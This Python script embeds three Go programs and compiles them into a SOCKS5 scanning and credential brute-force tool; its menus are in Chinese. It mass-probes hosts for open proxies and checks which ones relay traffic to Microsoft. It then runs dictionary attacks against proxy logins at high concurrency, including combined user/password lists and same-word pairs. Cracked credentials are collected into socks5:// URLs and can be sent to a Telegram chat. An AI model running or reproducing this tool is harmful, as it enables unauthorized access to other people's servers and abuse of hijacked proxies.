import subprocess
import sys
import tempfile
import os
import shutil
import hashlib
import json
import time
from datetime import datetime
import getpass
import threading

# --- 依赖库检查 ---
try:
    from tqdm import tqdm
except ImportError:
    print("错误: 缺少 'tqdm' 库。请运行 'pip install tqdm' 进行安装。")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("错误: 缺少 'requests' 库。请运行 'pip install requests' 进行安装。")
    sys.exit(1)

# ==========================================
# GO 核心代码区
# ==========================================

# 1. 协议验证器 (Protocol Verifier)
GO_SOURCE_CODE_PROTOCOL_VERIFIER = r'''
package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			// 发送 SOCKS5 握手包
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			conn.Close()
			
			// 检查响应: 版本5, 无需认证
			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
				fmt.Printf("S|%s\n", target)
			}
		}
		
		localCount++
		if localCount >= 20 {
			atomic.AddUint64(counter, 20)
			fmt.Println("P")
			localCount = 0
		}
	}
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	inputFile := flag.String("inputFile", "", "Input File")
	threads := flag.Int("threads", 500, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()

	file, err := os.Open(*inputFile)
	if err != nil { return }
	defer file.Close()

	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2)
	var wg sync.WaitGroup
	var count uint64

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
	}

	go func() {
		for scanner.Scan() {
			t := strings.TrimSpace(scanner.Text())
			if t != "" { jobs <- t }
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# 2. 深度连通性验证器 (Deep Verifier) - [修复] 目标更换为 Microsoft
GO_SOURCE_CODE_DEEP_VERIFIER = r'''
package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			// 1. 握手
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			
			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
				// 2. 尝试连接 www.microsoft.com:80 (比 Google 更容易全球访问)
				destHost := "www.microsoft.com"
				destPort := 80
				
				req := []byte{0x05, 0x01, 0x00, 0x03} // CONNECT, IPv4/Domain
				req = append(req, byte(len(destHost)))
				req = append(req, destHost...)
				
				portBytes := make([]byte, 2)
				binary.BigEndian.PutUint16(portBytes, uint16(destPort))
				req = append(req, portBytes...)
				
				conn.Write(req)
				
				reply := make([]byte, 10)
				n2, _ := conn.Read(reply)
				
				// 检查代理服务器是否报告成功 (0x00)
				if n2 >= 4 && reply[1] == 0x00 {
					fmt.Printf("S|%s\n", target)
				}
			}
			conn.Close()
		}
		
		localCount++
		if localCount >= 10 {
			atomic.AddUint64(counter, 10)
			fmt.Println("P")
			localCount = 0
		}
	}
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	inputFile := flag.String("inputFile", "", "Input")
	threads := flag.Int("threads", 200, "Threads")
	timeout := flag.Int("timeout", 10, "Timeout")
	flag.Parse()

	file, err := os.Open(*inputFile)
	if err != nil { return }
	defer file.Close()

	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2)
	var wg sync.WaitGroup
	var count uint64

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
	}

	go func() {
		for scanner.Scan() {
			t := strings.TrimSpace(scanner.Text())
			if t != "" { jobs <- t }
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# 3. 认证扫描器 (Auth Scanner) - 逻辑保持不变，依靠 Python 进行智能去重
GO_SOURCE_CODE_SCANNER = r'''
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Job struct {
	Host string
	Port string
	User string
	Pass string
}

func worker(jobs <-chan Job, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for j := range jobs {
		target := net.JoinHostPort(j.Host, j.Port)
		conn, err := net.DialTimeout("tcp", target, timeout)
		
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			
			// 发送: 支持无认证(0x00) 和 账号密码认证(0x02)
			conn.Write([]byte{0x05, 0x02, 0x00, 0x02})
			
			reply := make([]byte, 2)
			n, _ := conn.Read(reply)
			
			if n > 1 {
				if reply[1] == 0x00 {
					// 发现开放代理 (无需密码)
					// 格式: S|IP|Port||OPEN
					fmt.Printf("S|%s|%s||OPEN\n", j.Host, j.Port)
				} else if reply[1] == 0x02 && j.User != "" {
					// 需要认证，发送账号密码
					authReq := []byte{0x01} // Version 1
					authReq = append(authReq, byte(len(j.User)))
					authReq = append(authReq, j.User...)
					authReq = append(authReq, byte(len(j.Pass)))
					authReq = append(authReq, j.Pass...)
					
					conn.Write(authReq)
					
					authResp := make([]byte, 2)
					n2, _ := conn.Read(authResp)
					
					if n2 > 1 && authResp[0] == 0x01 && authResp[1] == 0x00 {
						// 认证成功
						// 格式: S|IP|Port|User|Pass
						fmt.Printf("S|%s|%s|%s|%s\n", j.Host, j.Port, j.User, j.Pass)
					}
				}
			}
			conn.Close()
		}
		
		localCount++
		if localCount >= 50 {
			atomic.AddUint64(counter, 50)
			fmt.Println("P")
			localCount = 0
		}
	}
	
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	proxyFile := flag.String("proxyFile", "", "Proxy File")
	dictFile := flag.String("dictFile", "", "Dict File")
	threads := flag.Int("threads", 500, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()

	// 1. 读取代理列表
	pData, err := os.ReadFile(*proxyFile)
	if err != nil { return }
	pLines := strings.Split(string(pData), "\n")
	var proxies []string
	for _, l := range pLines {
		t := strings.TrimSpace(l)
		if t != "" { proxies = append(proxies, t) }
	}

	// 2. 读取字典列表
	dData, err := os.ReadFile(*dictFile)
	if err != nil { return }
	dLines := strings.Split(string(dData), "\n")

	// 3. 启动 Worker
	jobs := make(chan Job, *threads*2)
	var wg sync.WaitGroup
	var count uint64

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
	}

	// 4. 生成并分发任务
	go func() {
		for _, proxy := range proxies {
			parts := strings.Split(proxy, ":")
			if len(parts) != 2 { continue }
			
			for _, credLine := range dLines {
				cl := strings.TrimSpace(credLine)
				if cl == "" { continue }
				cParts := strings.SplitN(cl, ":", 2)
				if len(cParts) == 2 {
					jobs <- Job{Host: parts[0], Port: parts[1], User: cParts[0], Pass: cParts[1]}
				}
			}
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# ==========================================
# Python 逻辑区
# ==========================================

COMPILED_BINARIES = {}
CACHE_DIR = ".socks5_toolkit_cache"
CONFIG_FILE = "config.json"

# --- 配置管理 ---
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(config, f, indent=4)

def handle_config_menu(config):
    while True:
        print_header("设置菜单")
        print(f"  [1] Bot Token:         {'*' * 10 if config.get('bot_token') else '未设置'}")
        print(f"  [2] Chat ID:           {config.get('chat_id') or '未设置'}")
        print(f"  [3] 自定义标识名:    {config.get('custom_id_key') or 'VPS'}")
        print(f"  [4] 自定义标识值:    {config.get('custom_id_value') or '未设置'}")
        print("\n  [b] 返回主菜单")
        
        choice = input("\n请选择要修改的项: ").lower()
        if choice == '1': config['bot_token'] = input("Bot Token: ")
        elif choice == '2': config['chat_id'] = input("Chat ID: ")
        elif choice == '3': config['custom_id_key'] = input("标识名: ")
        elif choice == '4': config['custom_id_value'] = input("标识值: ")
        elif choice == 'b': break
        save_config(config)

# --- 辅助工具 ---
def print_header(title):
    print("\n" + "="*50); print(f"--- {title} ---"); print("="*50)

def get_validated_input(prompt, validator, err_msg):
    while True:
        v = input(prompt).strip()
        if validator(v): return v
        print(err_msg)

def get_go_path():
    path = shutil.which("go")
    if path: return path
    for p in ["/usr/local/go/bin/go", "C:\\Go\\bin\\go.exe"]:
        if os.path.exists(p): return p
    return None

def compile_go_binaries():
    """编译 Go 二进制文件，自动处理环境变量缺失问题。"""
    go_exec = get_go_path()
    if not go_exec:
        print("错误: 未找到 'go' 命令。请先安装 Go 语言环境。")
        return False
    
    os.makedirs(CACHE_DIR, exist_ok=True)
    sources = {
        "protocol_verifier": GO_SOURCE_CODE_PROTOCOL_VERIFIER, 
        "deep_verifier": GO_SOURCE_CODE_DEEP_VERIFIER, 
        "scanner": GO_SOURCE_CODE_SCANNER
    }
    
    # 修复环境变量
    build_env = os.environ.copy()
    temp_base = tempfile.gettempdir()
    if 'HOME' not in build_env: build_env['HOME'] = temp_base
    build_env['GOCACHE'] = os.path.join(temp_base, 'go_build_cache')
    os.makedirs(build_env['GOCACHE'], exist_ok=True)

    print("正在检查核心组件...")
    for name, code in sources.items():
        out_path = os.path.join(CACHE_DIR, name + (".exe" if sys.platform=="win32" else ""))
        hash_path = os.path.join(CACHE_DIR, name + ".hash")
        cur_hash = hashlib.sha256(code.encode()).hexdigest()
        
        recompile = True
        if os.path.exists(out_path) and os.path.exists(hash_path):
            with open(hash_path, 'r') as f: 
                if f.read() == cur_hash: recompile = False
        
        if recompile:
            print(f"  - 编译优化 {name}...")
            src_path = os.path.join(CACHE_DIR, name + ".go")
            with open(src_path, "w", encoding="utf-8") as f: f.write(code)
            
            result = subprocess.run(
                [go_exec, "build", "-ldflags", "-s -w", "-o", out_path, src_path], 
                capture_output=True, text=True, env=build_env
            )
            
            if result.returncode != 0:
                print(f"\n[错误] 编译 {name} 失败！\n{result.stderr}")
                return False
                
            with open(hash_path, 'w') as f: f.write(cur_hash)
        
        COMPILED_BINARIES[name] = out_path
    return True

# --- 核心运行逻辑 ---
def run_go_process(bin_name, args, total_tasks, raw_output_file):
    bin_path = COMPILED_BINARIES.get(bin_name)
    if not bin_path: return

    print(f"\n启动高性能引擎 | 任务量: {total_tasks}")
    cmd = [bin_path] + args
    
    try:
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, 
            text=True, 
            encoding='utf-8', 
            errors='replace', 
            bufsize=1
        )
        
        success_count = 0
        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, desc="执行中", mininterval=0.5) as pbar:
            with open(raw_output_file, 'w', encoding='utf-8') as f_out:
                while True:
                    line = process.stdout.readline()
                    if not line and process.poll() is not None: break
                    if not line: continue
                    
                    line = line.strip()
                    if line == "P":
                        step = 20 if bin_name == "protocol_verifier" else (10 if bin_name == "deep_verifier" else 50)
                        pbar.update(step)
                    elif line.startswith("S|"):
                        success_count += 1
                        f_out.write(line + "\n")
                        f_out.flush()
                        parts = line.split("|")
                        if len(parts) >= 2:
                            display = parts[1]
                            if len(parts) >= 4 and parts[3]: display += f" ({parts[3]})"
                            tqdm.write(f"  [+] 发现: {display}")
                    elif line.startswith("panic:") or line.startswith("Error:"):
                        tqdm.write(f"  [Go内核警告]: {line}")

        print(f"\n任务完成。收到 {success_count} 个响应。")
        
    except Exception as e:
        print(f"\n运行时发生错误: {e}")
        try: process.kill()
        except: pass

# --- [重点修改] 结果合成与智能去重 ---
def finalize_results(raw_file, output_dir, file_prefix):
    """
    智能处理结果：
    1. 协议/深度验证：普通格式化。
    2. 认证扫描：智能去重逻辑。
       - 如果 IP 标记为 OPEN，则丢弃该 IP 的所有账号密码记录，只作为公共代理输出。
       - 如果 IP 成功登录超过 3 次（不同密码），视为泛解析/Honeypot，只作为公共代理输出。
    """
    if not os.path.exists(raw_file): return None
    
    timestamp = datetime.now().strftime("%Y%m%d-%H%M")
    final_filename = f"{file_prefix}_Result_{timestamp}.txt"
    final_path = os.path.join(output_dir, final_filename)
    
    # 临时存储结构: { "ip:port": [ { "user": "u", "pass": "p", "is_open": bool } ] }
    ip_map = {}
    
    print("\n正在进行智能分析与去重...")
    with open(raw_file, 'r', encoding='utf-8') as fin:
        for line in fin:
            if not line.startswith("S|"): continue
            parts = line.strip().split("|")
            
            # 处理基本验证 (protocol/deep)
            if len(parts) == 2:
                key = f"{parts[1]}" # IP or IP:Port
                if key not in ip_map: ip_map[key] = []
                ip_map[key].append({"is_open": True, "type": "basic"})
                
            # 处理认证扫描 (Auth Scan)
            elif len(parts) >= 5:
                ip_port = f"{parts[1]}:{parts[2]}"
                if ip_port not in ip_map: ip_map[ip_port] = []
                
                if parts[4] == "OPEN":
                    ip_map[ip_port].append({"is_open": True, "type": "auth"})
                else:
                    ip_map[ip_port].append({
                        "is_open": False, 
                        "user": parts[3], 
                        "pass": parts[4], 
                        "type": "auth"
                    })

    final_lines = []
    
    for ip_key, entries in ip_map.items():
        # 1. 检查是否包含 OPEN 状态
        is_public = False
        for e in entries:
            if e.get("is_open"):
                is_public = True
                break
        
        # 2. 检查是否为泛解析 (同一个IP有超过3个不同的账号密码成功)
        # 只有当没有明确 OPEN 标记时才检查这个
        if not is_public and len(entries) >= 3:
            # 简单检查 entries 中的 user/pass 是否确实不同 (虽然大概率不同)
            is_public = True
        
        if is_public:
            # 如果是公共代理，只输出一条记录，丢弃所有 user:pass
            # 格式: socks5://ip:port
            final_lines.append(f"socks5://{ip_key}")
        else:
            # 如果是私密代理，输出所有成功的组合
            for e in entries:
                if e.get("type") == "basic":
                    final_lines.append(f"socks5://{ip_key}")
                else:
                    final_lines.append(f"socks5://{e['user']}:{e['pass']}@{ip_key}")

    unique_lines = sorted(list(set(final_lines)))

    if unique_lines:
        with open(final_path, 'w', encoding='utf-8') as fout:
            fout.write("\n".join(unique_lines))
        print(f"[OK] 结果已生成: {final_path}")
        print(f"     原始响应: {sum(len(v) for v in ip_map.values())} -> 智能去重后: {len(unique_lines)}")
        return final_path
    else:
        print("[-] 未产生有效结果。")
        return None

# --- 任务处理函数 ---
def execute_verifier(config, output_dir, mode):
    modes = {
        "protocol": {"bin": "protocol_verifier", "name": "协议验证", "desc": "快速筛选响应Socks5握手的端口"},
        "deep": {"bin": "deep_verifier", "name": "连通验证", "desc": "深度验证通过 Microsoft 的连通性"}
    }
    info = modes[mode]
    print_header(info["name"]); print(info["desc"])
    
    f_path = get_validated_input("输入文件 (IP:Port): ", os.path.exists, "文件不存在")
    threads = get_validated_input("并发数 (默认800): ", lambda x: x=="" or x.isdigit(), "") or "800"
    
    total = sum(1 for l in open(f_path, 'r', errors='ignore') if l.strip())
    if total == 0: return

    raw_out = os.path.join(output_dir, "raw_temp.txt")
    run_go_process(info["bin"], ["-inputFile", f_path, "-threads", threads], total, raw_out)
    
    final = finalize_results(raw_out, output_dir, mode)
    if final: send_telegram(config, final, total)
    if os.path.exists(raw_out): os.remove(raw_out)

def handle_smart_scan(output_dir, config):
    print_header("智能混合扫描 (公共 + 私密)")
    print("说明: 同时测试 无密码 和 密码字典。")
    print("      自动去重: 如果检测到无需密码，会自动移除该IP的账号密码测试结果。")
    print("      自动识别: 如果一个IP允许任意密码登录，将自动标记为公共代理。\n")

    print("  [1] 组合爆破 (User.txt + Pass.txt)")
    print("  [2] 同名爆破 (User = Pass)")
    print("  [3] 经典模式 (User:Pass 文件)")
    
    c = input("\n选择字典模式: ")
    temp_dir = tempfile.mkdtemp()
    dict_path = os.path.join(temp_dir, "dict.txt")
    
    try:
        if c == '1':
            uf = get_validated_input("用户文件: ", os.path.exists, "不存在")
            pf = get_validated_input("密码文件: ", os.path.exists, "不存在")
            u_list = [l.strip() for l in open(uf) if l.strip()]
            p_list = [l.strip() for l in open(pf) if l.strip()]
            with open(dict_path, 'w') as f:
                for u in u_list:
                    for p in p_list: f.write(f"{u}:{p}\n")
        elif c == '2':
            wf = get_validated_input("字典文件: ", os.path.exists, "不存在")
            w_list = [l.strip() for l in open(wf) if l.strip()]
            with open(dict_path, 'w') as f:
                for w in w_list: f.write(f"{w}:{w}\n")
        elif c == '3':
            orig = get_validated_input("字典文件 (user:pass): ", os.path.exists, "不存在")
            shutil.copy(orig, dict_path)
        else: return

        proxy_file = get_validated_input("代理文件 (IP:Port): ", os.path.exists, "不存在")
        threads = get_validated_input("并发数 (默认1000): ", lambda x: x=="" or x.isdigit(), "") or "1000"
        timeout = get_validated_input("超时 (默认5): ", lambda x: x=="" or x.isdigit(), "") or "5"
        
        p_count = sum(1 for l in open(proxy_file, errors='ignore') if l.strip())
        d_count = sum(1 for l in open(dict_path, errors='ignore') if l.strip())
        total_tasks = p_count * d_count
        
        raw_out = os.path.join(temp_dir, "raw_scan.txt")
        # 直接复用 scanner，它本身就会同时探测 "无需认证" 和 "密码认证"
        # 核心在于 finalize_results 的智能处理
        run_go_process("scanner", ["-proxyFile", proxy_file, "-dictFile", dict_path, "-threads", threads, "-timeout", timeout], total_tasks, raw_out)
        
        final = finalize_results(raw_out, output_dir, "Smart_Scan")
        if final: send_telegram(config, final, p_count)
        
    finally:
        shutil.rmtree(temp_dir)

def send_telegram(config, file_path, total):
    if not config.get("bot_token") or not config.get("chat_id"): return
    if input("\n发送结果到 Telegram? (y/n): ").lower() != 'y': return
    
    try:
        url = f"https://api.telegram.org/bot{config['bot_token']}/sendDocument"
        cap = f"{config.get('custom_id_key','VPS')}: {config.get('custom_id_value','')}\n总量: {total}"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': config['chat_id'], 'caption': cap})
        print("发送成功!")
    except Exception as e: print(f"发送失败: {e}")

# --- 主程序入口 ---
def main():
    if not compile_go_binaries(): sys.exit(1)
    config = load_config()
    out_dir = f"Session_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(out_dir, exist_ok=True)
    
    print("\n" + "*"*60)
    print(" " * 10 + "SOCKS5 扫描与爆破工具 (Pro Optimized)")
    print(f"--- 结果目录: {out_dir} ---")
    print("*"*60)

    while True:
        print("\n--- 主菜单 ---")
        print("  [1] 验证 Socks5 协议 (快速)")
        print("  [2] 发现可用 Socks5 (深度验证 - Microsoft)")
        print("  [3] 智能混合扫描 (推荐 - 自动去重公共代理)")
        print("  [4] 设置")
        print("  [q] 退出")
        
        c = input("\n请选择: ").lower()
        if c == '1': execute_verifier(config, out_dir, "protocol")
        elif c == '2': execute_verifier(config, out_dir, "deep")
        elif c == '3': handle_smart_scan(out_dir, config)
        elif c == '4': handle_config_menu(config)
        elif c == 'q': break
        else: print("无效输入")

if __name__ == "__main__":
    main()
